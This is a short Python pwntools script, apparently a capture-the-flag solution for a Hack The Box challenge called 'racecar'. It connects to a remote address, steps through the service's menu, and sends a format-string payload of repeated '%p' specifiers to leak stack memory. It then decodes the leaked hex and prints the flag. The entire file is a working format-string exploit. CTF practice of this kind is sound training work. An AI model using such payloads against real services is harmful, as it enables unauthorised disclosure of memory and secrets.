from pwn import *

context.binary = binary = ELF('./racecar', checksec=False)
context.log_level = 'critical'

payload = b'%p' * 40

target = remote('94.237.63.224',52466)

target.sendlineafter(b'Name: ', b'pwned')
target.sendlineafter(b'Nickname: ', b'pwned')
target.sendlineafter(b'> ', b'2')
target.sendlineafter(b'> ', b'1')
target.sendlineafter(b'> ', b'2')
target.sendlineafter(b'> ', payload)

target.recvline()
output = target.recv(2048).decode()
decodedStrings = []
strings = output.split('0x')

for string in strings:
        newString = ''
        for i in range(0, len(string), 2):
                try:
                        newString += chr(int(string[i:i+2], 16))
                except Exception:
                        pass
        decodedStrings.append(newString[::-1])

strings = ''.join(decodedStrings)
print(strings[strings.index('HTB'):strings.index('}')+1])
